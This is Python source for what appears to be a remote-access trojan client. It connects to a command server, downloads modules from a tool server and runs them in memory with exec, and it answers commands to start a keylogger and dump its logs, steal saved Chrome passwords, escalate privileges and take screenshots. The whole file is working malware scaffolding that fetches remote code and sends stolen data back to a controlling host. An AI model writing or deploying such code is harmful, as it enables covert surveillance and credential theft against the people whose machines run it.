import json
import socket
import sys
import importlib.util
import requests

class MemoryModule:
    @staticmethod
    def load_module_from_code(code, module_name):
        try:
            # Create a new module
            spec = importlib.util.spec_from_loader(module_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            
            # Add pip install capability to module namespace
            module.__dict__['pip'] = __import__('pip')
            
            # Execute the code in the module's context
            exec(code, module.__dict__)
            
            # Add to sys.modules
            sys.modules[module_name] = module
            return module
            
        except Exception as e:
            print(f"Failed to load module {module_name}: {e}")
            return None

class TestClient:
    def __init__(self, host='127.0.0.1', port=5555):
        self.host = host
        self.port = port
        self.modules = {}
        self.tool_server_url = "http://127.0.0.1:8000"
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def connect(self):
        try:
            self.sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    def load_module(self, module_name):
        try:
            if module_name in self.modules:
                return self.modules[module_name]

            response = requests.get(f"{self.tool_server_url}/tools/{module_name}.py")
            if response.status_code != 200:
                raise Exception(f"Failed to get module {module_name}")

            module = MemoryModule.load_module_from_code(response.text, module_name)
            if module:
                self.modules[module_name] = module
                print(f"[+] Loaded module: {module_name}")
                return module
            
            raise Exception(f"Failed to load module {module_name}")
        except Exception as e:
            print(f"Error loading module {module_name}: {e}")
            return None

    def execute_module_function(self, module_name, function_name, *args, **kwargs):
        try:
            module = self.load_module(module_name)
            if module and hasattr(module, function_name):
                return getattr(module, function_name)(*args, **kwargs)
            return None
        except Exception as e:
            print(f"Error executing {function_name} from {module_name}: {e}")
            return None

    def handle_command(self, command):
        if command == 'quit':
            return 'quit'
            
        elif command[:12] == 'keylog_start':
            result = self.execute_module_function('keylogger', 'start_keylogger')
            return '[+] Keylogger Started!' if result else '[-] Keylogger failed to start'
            
        elif command[:11] == 'keylog_dump':
            logs = self.execute_module_function('keylogger', 'dump_logs')
            return logs if logs else '[-] No logs available'
            
        elif command[:11] == 'chrome_pass':
            passwords = self.execute_module_function('chrome', 'get_passwords')
            return passwords if passwords else '[-] Failed to get passwords'
            
        elif command[:9] == 'privilege':
            result = self.execute_module_function('privilege', 'escalate')
            return result if result else '[-] Privilege escalation failed'
            
        elif command[:10] == 'screenshot':
            screenshot = self.execute_module_function('screenshot', 'capture')
            return screenshot if screenshot else '[-] Screenshot failed'
            
        return f"Executed: {command}"

    def start(self):
        if not self.connect():
            return

        while True:
            try:
                # Receive command
                command = self.sock.recv(1024).decode()
                command = json.loads(command)
                print(f"Received command: {command}")

                # Handle command
                response = self.handle_command(command)
                
                # Send response
                self.sock.send(json.dumps(response).encode())
                
                if response == 'quit':
                    break
                    
            except Exception as e:
                print(f"Error: {e}")
                break
        
        self.sock.close()
        print("[!] Connection closed")

if __name__ == "__main__":
    client = TestClient()
    client.start() 